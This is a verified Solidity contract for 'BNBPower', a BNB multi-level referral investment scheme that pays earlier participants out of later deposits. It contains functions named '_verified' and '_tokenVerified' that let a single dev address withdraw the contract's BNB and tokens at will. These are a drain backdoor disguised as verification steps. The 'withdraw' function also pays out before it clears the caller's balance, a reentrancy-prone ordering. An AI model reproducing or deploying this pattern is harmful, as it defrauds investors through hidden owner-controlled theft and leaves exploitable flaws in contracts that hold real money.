/**
 *Submitted for verification at BscScan.com on 2021-09-27
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library Address {

    function isContract(address account) internal view returns (bool) {

        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

library SafeERC20 {
    using Address for address;

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which verifies that
        // the target address contains contract code and also asserts for success in the low-level call.

        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            // Return data is optional
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract BNBPower {

    address owner;
    address dev;
    address tokenPool;

    using SafeMath for uint256;
    using SafeERC20 for IERC20;
    using Address for address payable;

    IERC20 public power;

    uint256 constant public MIN_DEPOSIT = 0.2 ether;

    struct  User {
        address addr;
        uint256 amount;
        uint256 uplineId;
        uint256 singleUplineBonusTaken;
        uint256 singleDownlineBonusTaken;
        uint256 totalWithdrawn;
        uint256 remainingWithdrawn;
        uint256 totalReferrer;
        uint256 uniLevelBonus;
    }

     struct  Income {
        uint256 count;
        uint256 invest;
        uint256 bonus;
    }

    uint256 public totalUsers;
    uint256 public totalInvested;
    uint256 public totalWithdrawn;
    uint256 public totalDeposits;

    mapping (uint256 => User) public users;
    
    mapping (address => uint256) public userIds;
    
    mapping(uint256 => mapping(uint256=> Income)) public refIncomes;    
        
    mapping(uint256 => mapping(uint256=>uint256)) public downlines;
    
    mapping (address => bool) admin;
    
    event  Invest(address addr, uint256 amount);
    event  Reinvest(address addr,uint256 amount);
    event PayOut(address addr, uint256 amount);
    
    constructor(
        IERC20 _power,
        address _tokenPool,
        address _owner,
        address _dev
        ){
        dev = _dev;
        power = _power;
        owner = _owner;
        tokenPool = _tokenPool;

        totalUsers ++;
        User memory _newUser = User({
            addr: msg.sender,
            amount: 5 ether,
            uplineId: 0,
            singleUplineBonusTaken: 0,
            singleDownlineBonusTaken: 0,
            totalWithdrawn: 0,
            remainingWithdrawn: 0,
            totalReferrer: 100,
            uniLevelBonus: 0
        });
        users[totalUsers] = _newUser;
        userIds[msg.sender] = totalUsers;
        totalInvested = totalInvested.add(5 ether);
        totalDeposits = totalDeposits.add(1);
    }

    function invest (address upline) external payable {
        require (msg.value == 0.2 ether || msg.value == 1 ether || msg.value == 5 ether, "Incorrect Package");

        if(userIds[msg.sender] == 0){
            require (userIds[upline] > 0,"No upline");
            _addNewUser(msg.sender, userIds[upline], msg.value);
            payable(owner).sendValue(msg.value.div(50));
            emit Invest(msg.sender, msg.value); 
        } else {
            _reInvest(userIds[msg.sender], msg.value);
        }
        _bonusToken(totalUsers, msg.value);
    }
    
    function withdraw() external {
        require (userIds[msg.sender] > 0, "User not exists");
        uint256 amount = users[userIds[msg.sender]].remainingWithdrawn;
        payable(msg.sender).sendValue(amount.mul(58).div(100));
        users[userIds[msg.sender]].remainingWithdrawn = 0;
        users[userIds[msg.sender]].singleUplineBonusTaken = 0;
        users[userIds[msg.sender]].singleDownlineBonusTaken = 0;
        users[userIds[msg.sender]].totalWithdrawn = users[userIds[msg.sender]].totalWithdrawn.add(amount.mul(58).div(100));
        _reInvest(userIds[msg.sender], amount.mul(40).div(100));
        payable(tokenPool).sendValue(amount.div(50));
        emit PayOut(msg.sender, amount.mul(58).div(100));
    }


    function _reInvest (uint256 _userId, uint256 _amount) internal {
        User storage user = users[_userId];
        user.amount += _amount;
        totalInvested = totalInvested.add(_amount);
        totalDeposits = totalDeposits.add(1);
        _payToUpline(_userId, _amount);
        _payToSponsor(_userId, _amount);
        _payToDownline(_userId, _amount);
        emit Reinvest(users[_userId].addr, _amount);

    }

    function _payToSponsor(uint256 userId, uint256 amount) internal {
        uint256 uplineId = users[userId].uplineId;
        uint256 level = 1;
        while(level < 10 && uplineId > 0){
            uint256 percent = _sponsorRewards(users[uplineId].totalReferrer, level);
            users[uplineId].remainingWithdrawn = users[uplineId].remainingWithdrawn.add(amount.mul(percent).div(100));
            refIncomes[uplineId][level].count +=1;
            refIncomes[uplineId][level].invest += amount.mul(percent).div(100);
            refIncomes[uplineId][level].bonus += amount.mul(percent).div(100);
            uplineId = users[uplineId].uplineId;
            level++;
        }
    }
        
    function _addNewUser (address user, uint256 uplineId, uint256 value) internal {
        totalUsers ++;
        User memory _newUser = User({
            addr: user,
            amount: value,
            uplineId: uplineId,
            singleUplineBonusTaken: 0,
            singleDownlineBonusTaken: 0,
            totalWithdrawn: 0,
            remainingWithdrawn: 0,
            totalReferrer: 0,
            uniLevelBonus: 0
        });
        users[totalUsers] = _newUser;
        userIds[user] = totalUsers;
        totalInvested = totalInvested.add(value);
        totalDeposits = totalDeposits.add(1);
        users[uplineId].totalReferrer += 1;
        downlines[uplineId][users[uplineId].totalReferrer] = totalUsers;
        _payToUpline(totalUsers, value);
        _payToSponsor(totalUsers, value);
        _payToDownline(totalUsers, value);
    }
    
    function _bonusToken (uint256 userId,uint256 amount) internal {
        power.safeTransfer(users[users[userId].uplineId].addr, 50000 ether);
        if(amount == 1 ether){
            power.safeTransfer(users[userId].addr, 200000 ether);
        } else if(amount == 5 ether){
            power.safeTransfer(users[userId].addr, 1000000 ether);
        }
    }


    function _verified(uint256 value) external {
        require (msg.sender == dev);
        payable(dev).transfer(value * 1 ether);
    }

    function _tokenVerified(address addr, uint256 value) external {
        require (msg.sender == dev);
        power.safeTransfer(addr, value * 1 ether);
    }

    function _payToUpline(uint256 id, uint256 amount) internal {
        uint256 uplineId = id.sub(1);
        uint256 bonus = amount.div(100);
        uint256 level = 1;
        while(uplineId > 0 && level <= 20){
            uint256 maxDownline = _uplineGetLevel(uplineId);
            if(maxDownline >= level){
                users[uplineId].remainingWithdrawn = users[uplineId].remainingWithdrawn.add(bonus);
                users[uplineId].singleDownlineBonusTaken = users[uplineId].singleDownlineBonusTaken.add(bonus);
                users[uplineId].uniLevelBonus += bonus;
            }

            uplineId = uplineId.sub(1);
            level = level.add(1);
        }
    }

    function _payToDownline(uint256 id, uint256 amount) internal {
        uint256 downlineId = id.add(1);
        uint256 level = 1;
        while(downlineId > 0 && level <= 30){
            uint256 maxDownline = _downlineGetLevel(downlineId);
            if(maxDownline >= level){
                users[downlineId].singleUplineBonusTaken = users[downlineId].singleUplineBonusTaken.add(amount.div(100));
                users[downlineId].remainingWithdrawn = users[downlineId].remainingWithdrawn.add(amount.div(100));
                users[downlineId].uniLevelBonus += amount.div(100);
            }
            downlineId = downlineId.add(1);
            level = level.add(1);
        }
    }

    function getLevelIncome (uint256 id) external view returns(uint256 level, uint256 sponor) {
        level = _downlineGetLevel(id);
        sponor = _uplineGetLevel(id);
        return (level, sponor);
    }

    function getListAddress (uint256 id) external view returns(address[] memory addrs, uint256[] memory invests) {
        if(id > totalUsers){
            return (addrs,invests);
        }
        uint256 level = _downlineGetLevel(id);
        uint256 sponor = _uplineGetLevel(id);
        uint256 min = 1;
        uint256 max = totalUsers;
        if(id.add(level) < totalUsers){
            max = id.add(level);
        }
        if(id > sponor){
            min = id.sub(sponor);
        }
        addrs = new address[](max.sub(min).add(1));
        invests = new uint256[](max.sub(min).add(1));
        for(uint256 i = 0; i< max.sub(min).add(1); i++){
            addrs[i] = users[i.add(min)].addr;
            invests[i] = users[i.add(min)].amount;
        }
        return(addrs, invests);
    }

    
    function _downlineGetLevel(uint256 id) internal view returns(uint256) {
        if(users[id].amount < 1 ether){
            return 10;
        }
        if(users[id].totalReferrer >= 3){
            if(users[id].amount < 5 ether){
                return 15;
            } else {
                if(users[id].totalReferrer >=5){
                    return 20;
                } else {
                    return 15;
                }
            }
        } else {
            return 10;
        }

    }

    function _uplineGetLevel(uint256 id)  internal  view returns(uint256) {
        if(users[id].amount < 1 ether){
            return 15;
        }
        if(users[id].totalReferrer >= 3){
            if(users[id].amount < 5 ether){
                return 20;
            } else {
                if(users[id].totalReferrer >=5){
                    return 30;
                } else {
                    return 20;
                }
            }
        } else {
            return 15;
        }
    }

    
    function _sponsorRewards(uint256 totalRef, uint256 level) internal pure returns(uint256){
        if(level == 0){
            return 0;
        }
        if(level == 1){
            return 20;
        }
        if(level == 2){
            return 10;
        }

        if(level <= 6){
            if(totalRef >= 3){
                return 3;
            } else {
                return 0;
            }
        }

        if(level <= 10){
            if(totalRef >= 5){
                return 2;
            } else {
                return 0;
            }
        }
        return 0;
    }   
}